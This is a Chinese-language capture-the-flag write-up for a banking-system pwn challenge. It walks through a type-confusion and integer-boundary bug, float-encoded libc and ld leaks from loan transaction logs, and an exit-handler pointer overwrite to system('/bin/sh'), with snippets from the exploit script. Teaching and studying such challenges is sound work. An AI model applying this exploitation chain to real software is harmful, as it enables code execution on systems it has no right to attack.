# aaaa

## 题目简述

题目是一个交互式银行系统，包含账户类型、余额、存款/取款、转账、贷款、分层 tier、管理员保留位与交易日志。关键接口在主程序字符串里可见，例如“Type: ADMIN / Reserved Field / Change Bracket Value / Take Loan”等字段，以及 `set_tier / upgrade / downgrade / take_loan` 等操作入口。

核心威胁面在于：管理员对象的 `Reserved Field` 与贷款分级/余额分支绑定后，`downgrade tier` 会触发越界/整数行为异常（官方说明直接给出 race + type confuse），使得可控向关键地址写入。再结合 `loan` 交易日志里的 float 字段进行泄漏，构造 `libc`、`ld` 地址后执行退出钩子覆盖拿 shell。

## 解题过程

### 关键观察

从官方 exploit 脚本可以确认，菜单交互围绕以下操作序列展开：

```python
def set_tier(id): ...
def downgrade(id, num): ...
def reserved(id, val): ...
def loan(id): ...
def change_bracket_value(id, new_value): ...
```

这与 README 中的方向一致：先利用 `set_tier` 阶段的竞态/类型错位构造可写原语，再走 `loan` 形成 float 泄露。

`aaaa` 的 `main` 为二进制且缺少源码文件；但 `strings` 可确认了关键菜单项和日志文本（如 `Invalid upgrade...`、`MODIFY Reserved Field`、`LOAN`、`Set tier for account`），支持 exploit 脚本所覆盖的交互模型。

### 利用链

1. 初始化并构造角色布局

```python
sl(str(0x1000000))
add_account(b"blob", 0, 0x5000)
add_account(b"bleb", 1, 0x5000)
add_account(b"admin", 2, 0x5000)
```

2. 切换账户类型与 tier，利用 `reserved field` 的浮点位表示重写管理员余额元数据

```python
change_account_type(2, 1)
set_tier(2)
change_account_type(2, 2)
reserved(2, floatbits(-0x80000000*0x10))
```

`floatbits` 用于把 64-bit 数值按 `double` 的位模式注入，形成后续越界写入前提（官方描述为 `abs(INT_MIN)=INT_MIN` 方向的边界利用）。

3. 触发两次 `downgrade_tier` 泄漏指针

```python
downgrade(2, 0x80000000-((offset_to_libc+0x210fd8)//8))
loan(2)
```

随后通过 `view_transactions(2)` 读取 `LOAN` 条目的金额并转成浮点位：

```python
view_transactions(2)
libc.address = ftoi(float(ru(","))) - libc.sym['malloc']
```

再重复一轮取得 `ld` 泄漏：

```python
ld.address = ftoi(float(ru(","))) - 0x3c000
```

4. 先计算 `dl_fini`，然后把 `system` 加密后写入目标

```python
dl_fini = ld.address + 0x5120
encrypted_dl_fini = ftoi(float(ru(",")))
enc = decrypt(encrypted_dl_fini, dl_fini)
enc_system = encrypt(libc.sym['system'], enc)
```

5. 最终利用 `change_bracket_value` 把 `rdi/rsp/ret chain` 所需对象落盘并触发控制流到 `system("/bin/sh")`

```python
change_bracket_value(2, itof(binsh(libc)))
downgrade(...)
change_bracket_value(2, itof(enc_system))
```

### 验证

官方 exploit 采用本地/远程两种启动路径，最终在 payload 的最后一段不再请求交互菜单，而直接与 shell 会话互动：先 `echo '$$'` 再 `cat flag.txt`。其思路是利用贷款链拿到 libc/ld 泄漏并完成函数指针覆盖，若最终 shell 能执行 `cat flag.txt` 即为链路成功。

## 方法总结

- 核心技巧：利用 tier/账户元数据路径里的 float 与整型边界错配（`-0x80000000` 级别）制造非预期写，再用贷款日志做指针泄漏，最后用可控槽位覆盖控制向量。
- 识别信号：出现管理员专用保留字段 + 可变分级 + 贷款/交易日志，且日志包含可解析浮点值时，优先考虑“浮点位污染 + 交易回放泄露”路线。
- 复用要点：保持 `downgrade amount` 的数学关系与堆布局一致，先定位 libc/ld，再把最终控制点指向已知 gadget 或函数入口进行后续 ROP/RW。
